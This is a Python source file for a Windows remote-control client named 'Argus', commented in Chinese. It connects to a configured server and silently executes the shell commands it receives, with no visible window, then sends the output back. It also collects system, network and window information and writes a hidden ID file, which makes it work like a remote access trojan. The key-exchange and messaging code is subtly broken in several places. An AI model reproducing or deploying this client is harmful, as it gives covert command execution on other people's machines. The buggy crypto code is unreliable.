import json
import pprint
import socket
import subprocess
import time
import netifaces
import uuid
import os
import platform
import threading
from cryptography.fernet import Fernet

import psutil
import win32api
import win32con
import pygetwindow as gw
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa

# 设置服务器的IP地址和端口号
server_ip = "127.0.0.1"
server_command_port = 1818
server_inform_port = 1819

client_id = ""
version = "1.0.0"


# 目前有多个问题亟需解决：
# 1. 直接操作被控制端窗口属性，网络状态等Python函数操作
# 2. 传输指令和回显需要加密

class ArgusProtocol:
    client_rsa_private_key = None
    client_rsa_public_key = None
    server_rsa_public_key = None
    aes_key = None

    uuid_file_path = os.path.join(os.path.expanduser("~"), "Argus_UUID.ini")

    argus_data_root = os.path.join(os.path.expanduser("~"), ".argus\\")
    client_rsa_public_file_path = os.path.join(argus_data_root, "client_RSA_public_key.pem")
    client_rsa_private_file_path = os.path.join(argus_data_root, "client_RSA_private_key.pem")
    server_rsa_file_path = os.path.join(argus_data_root, "server_RSA_public_key.pem")
    aes_file_path = os.path.join(argus_data_root, "AES_key.pem")

    def __init__(self):
        pass

    @staticmethod
    def key_agreement_rsa():
        """
        通过RSA密钥协商来生成并存储公钥、私钥、AES密钥的函数。
        如果密钥文件存在，就从文件读取密钥。不存在则需要和服务器通信取得服务器公钥，并传输客户端公钥和AES密钥。

        Returns:
            str: 返回一个字符串 "Done"，表示操作已完成。

        Raises:
            N/A
        """
        if not os.path.exists(ArgusProtocol.argus_data_root):
            os.mkdir(ArgusProtocol.argus_data_root)

        if os.path.exists(ArgusProtocol.client_rsa_public_file_path) and \
                os.path.exists(ArgusProtocol.client_rsa_private_file_path) and \
                os.path.exists(ArgusProtocol.server_rsa_file_path) and \
                os.path.exists(ArgusProtocol.aes_file_path):
            # 如果4个密钥文件都存在，从文件中读取密钥
            # 此处得到的密钥均为可使用类型，直接使用即可。

            # 创建一个临时类，用于调取从文件中读取密钥的方法
            argus_file_read_obj = ArgusProtocol()
            argus_file_read_obj.__read_client_rsa_public_file()
            argus_file_read_obj.__read_client_rsa_private_file()
            argus_file_read_obj.__read_server_rsa_public_file()
            argus_file_read_obj.__read_aes_key()

        else:
            # 生成新的密钥对和AES密钥，并存储到文件
            client_private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            client_public_key = client_private_key.public_key()
            client_private_key_pem = client_private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
            client_public_key_pem = client_public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            aes_key = client_private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )

            ArgusProtocol.client_rsa_public_key = client_public_key
            ArgusProtocol.client_rsa_private_key = client_private_key
            ArgusProtocol.aes_key = aes_key

            # 将生成的密钥写入文件
            with open(ArgusProtocol.client_rsa_public_file_path, 'w') as f:
                f.write(client_public_key_pem.decode())
            with open(ArgusProtocol.client_rsa_private_file_path, 'w') as f:
                f.write(client_private_key_pem.decode())
            with open(ArgusProtocol.aes_file_path, 'w') as f:
                f.write(aes_key.decode())

            # 与服务器协商：
            # 第一步，得到服务器公钥，发送客户端公钥
            # 第二步，使用服务器公钥加密AES，并传输给服务器
            try:
                agreement_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                agreement_socket.connect((server_ip, server_inform_port))
                try:
                    # 发送客户端公钥并等待回应
                    packed_agreement = ArgusProtocol.pack("AGREEMENT_RSA", client_public_key_pem)
                    agreement_socket.sendall(json.dumps(packed_agreement).encode() + b'\n')
                    agreement_socket.settimeout(5)
                    agreement_response = agreement_socket.recv(1024)
                    # 此处应收到服务器公钥，位于 CONTENT 字段
                    if (ArgusProtocol.unpack(agreement_response))["TYPE"] == "AGREEMENT_RSA_OK":
                        server_public_key_pem = (ArgusProtocol.unpack(agreement_response))["CONTENT"]
                        server_public_key = serialization.load_pem_public_key(server_public_key_pem,
                                                                              backend=default_backend())
                        ArgusProtocol.server_rsa_public_key = server_public_key
                        with open(ArgusProtocol.server_rsa_file_path, 'w') as f:
                            f.write(server_public_key_pem)

                        # 加密AES并发送：
                        encrypted_aes_key = server_public_key.encrypt(
                            aes_key,
                            padding.OAEP(
                                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                algorithm=hashes.SHA256(),
                                label=None
                            )
                        )
                        packed_agreement = ArgusProtocol.pack("AGREEMENT_AES", encrypted_aes_key)
                        agreement_socket.sendall(json.dumps(packed_agreement).encode() + b'\n')
                        agreement_socket.settimeout(5)
                        agreement_response = agreement_socket.recv(1024)
                        if (ArgusProtocol.unpack(agreement_response))["TYPE"] == "AGREEMENT_AES_OK":
                            print("AES encrypted key transmitted successfully.")

                    else:
                        print("错误，接收服务器端公钥阶段：服务器发送数据包格式错误。")

                except socket.timeout:
                    print("连接超时，无法连接到服务器。")

            except ConnectionRefusedError:
                print("Connection refused by the target computer.")
            except socket.gaierror:
                print("Invalid server address.")
            except socket.error:
                print("Failed to create a socket object.")
            except Exception as e:
                print(f"Connection error: {str(e)}")

        # 打印密钥内容并返回 "Done"
        print(ArgusProtocol.client_rsa_public_key,ArgusProtocol.server_rsa_public_key)
        return "Done"

    @staticmethod
    def generate_uuid():
        # 获取 UUID 文件路径
        uuid_file_path = ArgusProtocol.uuid_file_path
        # 尝试读取已有的 UUID
        if os.path.exists(uuid_file_path):
            with open(uuid_file_path, 'r') as f:
                cid = f.read()
                print("The UUID exists.")
        else:
            # 与
            uuid_agreement_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            uuid_agreement_socket.sendall(ArgusProtocol.pack("AGREEMENT_UUID", ""))
            uuid_agreement_socket.settimeout(5)
            uuid_recv = uuid_agreement_socket.recv(1024)
            cid = ArgusProtocol.unpack(uuid_recv)

            with open(uuid_file_path, 'w') as f:
                f.write(cid)
                os.chmod(uuid_file_path, 0o600)
                win32api.SetFileAttributes(uuid_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
                print("UUID created successfully.")

        return cid

    # 以下文件读取方法不返回有效值，直接改变实例的变量
    def __read_client_rsa_public_file(self):
        with open(self.client_rsa_public_file_path, 'r') as f:
            client_rsa_public_key_pem = f.read()
            self.client_rsa_public_key = serialization.load_pem_public_key(client_rsa_public_key_pem.encode(),
                                                                           backend=default_backend())
            return 0

    def __read_client_rsa_private_file(self):
        with open(self.client_rsa_private_file_path, 'r') as f:
            client_rsa_private_key_pem = f.read()
            self.client_rsa_private_key = serialization.load_pem_private_key(client_rsa_private_key_pem.encode(),
                                                                             password=None, backend=default_backend())
            return 0

    def __read_aes_key(self):
        with open(self.aes_file_path, 'r') as f:
            self.aes_key = Fernet(f.read())
            return 0

    def __read_server_rsa_public_file(self):
        with open(self.server_rsa_file_path, 'r') as f:
            server_rsa_public_key_pem = f.read()
            self.server_rsa_public_key = serialization.load_pem_public_key(server_rsa_public_key_pem.encode(),
                                                                           backend=default_backend())
            return 0

    @staticmethod
    def pack(msg_type, content):
        """封装消息到字典，并转换为JSON字符串。注意传入的content参数必须是字节形式，即使用了encode()"""
        """TYPE包含：CMD_COMMAND, PYTHON_FUNCTION, INFO, OTHER, AGREEMENT"""
        encrypt_core = Fernet(ArgusProtocol.aes_key)
        encrypt_content = encrypt_core.encrypt(content)
        msg_id = str(uuid.uuid4())[0:6]

        protocol_dict = {
            "FLAG": "ARGUS",
            "SENDER": "CLIENT",
            "TYPE": msg_type,
            "UUID": client_id,
            "VERSION": version,
            "MSG_ID": msg_id,
            "CONTENT": encrypt_content.decode()
        }

        return str(protocol_dict).encode()

    @staticmethod
    def unpack(json_data):
        """从JSON字符串解析消息并返回字典"""
        return json.loads(json_data)


def get_comp_info():
    # 信息获取函数，得到硬件基础信息，网络信息等
    interfaces = netifaces.interfaces()
    date_info = time.strftime("%Y-%m-%d", time.localtime())
    cpu_info = {
        'cpu_logical_cores': psutil.cpu_count(logical=True),
        'cpu_physical_cores': psutil.cpu_count(logical=False),
        'cpu_freq': psutil.cpu_freq(),
        'cpu_percent': psutil.cpu_percent()
    }
    basic_info = {
        'os_info': platform.platform(),
        # 获取操作系统的详细信息
        'system_info': platform.uname(),
        # 获取 CPU 信息
        'cpu_info': cpu_info,
        # 获取内存信息
        'memory_info': psutil.virtual_memory(),
        # 获取硬盘信息
        'disk_info': psutil.disk_partitions()
    }
    network_info = []
    for iface in interfaces:
        try:
            addresses = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addresses:
                ipv4_addresses = addresses[netifaces.AF_INET]
                mac_address = addresses[netifaces.AF_LINK]
                network_info_frag = {
                    'Interface': iface,
                    'IPV4_address': ipv4_addresses[0]['addr'],
                    'IPV4_netmask': ipv4_addresses[0]['netmask'],
                    'MAC_address': mac_address[0]['addr']
                }
                network_info.append(network_info_frag)
        except ValueError as e:
            print(f"An error occurred during obtaining the network info. {e}")
            pass
    comp_info = {
        'title': "Comprehensive Info",
        'content': {
            'overview': platform.uname()._asdict(),
            'basic_info': basic_info,
            'network_info': network_info,
            'date_stramp': date_info,
            'uuid': client_id
        }
    }
    info_data_package = ArgusProtocol.pack("INFO", comp_info)
    return info_data_package
    # Return Data Format:
    # [{'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': ''},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Date': '2023-08-05'}]


def get_windows_info():
    window_collection = []
    all_windows = gw.getAllWindows()

    for window in all_windows:
        window_info = {
            "Window title": window.title,
            "Visibility": window.visible,
            "Height": window.height,
            "Width": window.width,
            "Is Minimized": window.isMinimized,
            "Is Maximized": window.isMaximized,
            "Is Active": window.isActive
        }
        window_collection.append(window_info)

    return window_collection


def generate_uuid():
    # 获取 UUID 文件路径
    uuid_file_path = os.path.join(os.path.expanduser("~"), "Argus_UUID.ini")

    # 尝试读取已有的 UUID
    if os.path.exists(uuid_file_path):
        with open(uuid_file_path, 'r') as f:
            cid = f.read()
            print("The UUID exists.")
    else:
        # 生成新的 UUID 并写入文件
        cid = str(uuid.uuid4())
        with open(uuid_file_path, 'w') as f:
            f.write(cid)
            os.chmod(uuid_file_path, 0o600)
            win32api.SetFileAttributes(uuid_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            print("UUID created successfully.")

    return cid


# def initialize_unsymmetrical_encryption():


def initialize_socket(target_host, target_port):
    try:
        socket_instance = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_instance.connect((target_host, target_port))
        return socket_instance
    except ConnectionRefusedError:
        print("Connection refused by the target computer.")
    except socket.gaierror:
        print("Invalid server address.")
    except KeyboardInterrupt:
        print("User interrupted the connection initialization.")
    except socket.error:
        print("Failed to create a socket object.")
    except Exception as e:
        print(f"Connection error: {str(e)}")
    return None


def get_info(client_socket):
    if client_socket is None:
        return None
    while True:
        try:
            # 设置接收超时时间为 10 秒
            # PS: 这个很有意思，即使是延时，也仍然在监听
            client_socket.settimeout(10)
            response = client_socket.recv(1024)
            response_str = response.decode('gbk').strip()
            if response_str.startswith("Connection Permitted: "):
                response_uuid = response_str[22:]
                print("Server Response UUID: " + response_uuid)
                if response_uuid == client_id:
                    print("Connection permitted, going to connect...")
                    connect_to_server(server_ip, server_command_port)

            else:
                print("Unrecognized Server Message:" + response_str)
        except socket.timeout:
            # 在测试阶段可能经常触发这个except，但是到时候会在服务器端写好keep alive，因此不用担心。
            print("服务器没有回应，等待响应超时")


def send_info(client_socket, send_info_buffer):
    if client_socket is None:
        return None
    try:
        client_socket.sendall(json.dumps(send_info_buffer).encode() + b'\n\n')
        print("已向服务器发送对应数据:" + send_info_buffer)
    except socket.timeout:
        print("连接超时，无法连接到服务器。")
    except Exception as e:
        # 其他异常处理，我也不知道会有什么问题
        print(f"连接出错: {str(e)}")
        socket.close()
    except KeyboardInterrupt:
        print("User Ended The Connection.")
        socket.close()


def connect_to_server(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
        client_socket.send(b"Connection Successfully Built.\n")
        print("已连接到服务器")

        while True:
            data = client_socket.recv(1024)
            if not data:
                print("与服务器断开连接")
                break

            result = execute_command(data)

            client_socket.send(result)
            if result.decode('gbk') == "Connection Detach\n":
                client_socket.close()
                return 0

    except ConnectionRefusedError:
        print("无法连接到服务器")
    except KeyboardInterrupt:
        print("用户中断")
    finally:
        client_socket.close()
        print("已关闭连接")


process = None


def execute_command(command):
    global process

    command = command.decode().strip()
    print("收到指令:", command)

    try:
        if command.startswith('cd'):
            # 切换目录命令
            directory = command.split(' ')[1]
            os.chdir(directory)
            return "目录切换成功\n".encode()

        if command.startswith('rc exit'):
            if process is not None and process.poll() is None:
                # 如果子进程存在且尚未终止，则终止子进程
                process.terminate()
                process.wait()
                process = None
            return "Connection Detached\n".encode()

        else:
            if process is None or process.poll() is not None:
                # 如果没有子进程或子进程已经终止，则创建新的子进程
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW  # 不显示窗口
                )
            else:
                # 如果子进程存在且尚未终止，则发送指令给子进程
                process.stdin.write(command.encode() + b'\n')
                process.stdin.flush()

        result = process.communicate()[0]
        print(result)
        return result
    except subprocess.CalledProcessError as e:
        error_msg = "命令执行失败: " + str(e)
        print(error_msg)
        return error_msg.encode()
    except Exception as e:
        print("An error occurred:", e)


if __name__ == "__main__":
    # try:
    #     client_id = generate_uuid()
    #     print(client_id)
    #     info_socket = initialize_socket(server_ip, server_inform_port)
    #
    #     comprehension_info = get_comp_info()
    #     get_info_thread = threading.Thread(target=get_info, args=(info_socket,))
    #     # 多线程，将监听端口单独放出，便于管理
    #     get_info_thread.start()
    #     send_info(info_socket, comprehension_info)
    #
    # except KeyboardInterrupt:
    #     print("User Ended The Connection.Global.")
    # except Exception as e:
    #     print("Error, code:" + str(e))

    #     # # # Debug Area Below # # #
    print(get_comp_info())
    # print(get_all_windows())
    #     # connect_to_server(server_ip, server_command_port)
    #     # # # Debug Area Above # # #
